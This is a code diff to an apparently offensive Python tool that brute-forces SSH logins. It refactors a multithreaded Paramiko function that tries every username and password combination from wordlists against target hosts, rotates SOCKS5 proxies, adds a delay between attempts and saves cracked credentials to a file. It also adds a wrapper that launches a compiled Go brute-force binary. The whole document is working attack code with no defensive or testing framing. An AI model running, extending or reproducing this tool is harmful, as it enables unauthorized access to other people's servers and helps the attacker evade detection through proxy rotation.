@@ -8,6 +8,8 @@ import socket
 from itertools import cycle
 from tqdm import tqdm
 from termcolor import colored
+from concurrent.futures import ThreadPoolExecutor
+import paramiko
 
 # Load wordlists for SSH Bruteforce
 def load_wordlists():
@@ -42,8 +44,8 @@ def load_wordlists():
     return usernames, passwords
 
 
-# Perform SSH Bruteforce
-def bruteforce_ssh(targets, usernames, passwords, max_threads=5):
+# Perform SSH Bruteforce using Python (Paramiko)
+def python_bruteforce_ssh(targets, usernames, passwords, max_threads=5):
     """
     Perform SSH brute force attack using Paramiko.
 
@@ -52,12 +54,10 @@ def bruteforce_ssh(targets, usernames, passwords, max_threads=5):
     :param passwords: List of passwords to test
     :param max_threads: Maximum number of concurrent threads
     """
-    from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
-
-    results_file = "results/cracked.txt"
+    results_file = "results/cracked_python.txt"
     os.makedirs("results", exist_ok=True)
 
-    print("[INFO] Starting brute force attack...")
+    print("[INFO] Starting Python-based brute force attack...")
     proxy_cycle = cycle(global_tested_proxies) if global_config["proxy_usage"] else None
 
     def attempt_login(host, username, password, proxy=None):
@@ -68,7 +68,6 @@ def bruteforce_ssh(targets, usernames, passwords, max_threads=5):
         :param username: SSH username
         :param password: SSH password
         :param proxy: Optional SOCKS5 proxy
-        :return: None
         """
         # Check if scan is paused or stopped
         while pause_event.is_set():
@@ -80,12 +79,12 @@ def bruteforce_ssh(targets, usernames, passwords, max_threads=5):
 
         try:
             # Set up SSH client
-            client = SSHClient()
-            client.set_missing_host_key_policy(AutoAddPolicy())
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
             # Apply proxy settings if enabled
             if proxy:
-                proxy_host, proxy_port = proxy
+                proxy_host, proxy_port = proxy.split(":")
                 socks.setdefaultproxy(socks.SOCKS5, proxy_host, int(proxy_port))
                 socket.socket = socks.socksocket
 
@@ -99,24 +98,46 @@ def bruteforce_ssh(targets, usernames, passwords, max_threads=5):
 
             client.close()
 
-        except AuthenticationException:
+        except paramiko.AuthenticationException:
             pass  # Ignore failed attempts
-
         except Exception as e:
             print(colored(f"[ERROR] {host} - {username}:{password}: {e}", "red"))
 
+        # Introduce random delay
+        time.sleep(0.5)
+
     # Start multithreaded bruteforcing
-    with threading.ThreadPoolExecutor(max_threads) as executor:
+    with ThreadPoolExecutor(max_threads) as executor:
         futures = []
         for target in targets:
             proxy = next(proxy_cycle) if proxy_cycle else None
             for username in usernames:
                 for password in passwords:
-                    futures.append(
-                        executor.submit(attempt_login, target, username, password, proxy)
-                    )
+                    futures.append(executor.submit(attempt_login, target, username, password, proxy))
 
         for future in tqdm(futures, desc="Bruteforcing SSH", total=len(futures)):
             future.result()  # Ensure exceptions are caught
 
     print(f"[INFO] Brute force complete. Results saved to {results_file}.")
+
+
+# Perform SSH Bruteforce using Golang binary
+def golang_bruteforce_ssh():
+    """
+    Perform SSH brute force attack using the Golang method.
+
+    This function calls the compiled Golang binary (golang_brute).
+    """
+    print("[INFO] Starting Golang SSH Bruteforce...")
+
+    if not os.path.exists("golang_brute"):
+        print("[ERROR] Golang binary not found. Compile it first using:")
+        print("       go build -o golang_brute golang_brute.go")
+        return
+
+    try:
+        subprocess.run(["./golang_brute"], check=True)
+    except FileNotFoundError:
+        print("[ERROR] Golang binary not found.")
+    except subprocess.CalledProcessError:
+        print("[ERROR] Golang bruteforce failed.")
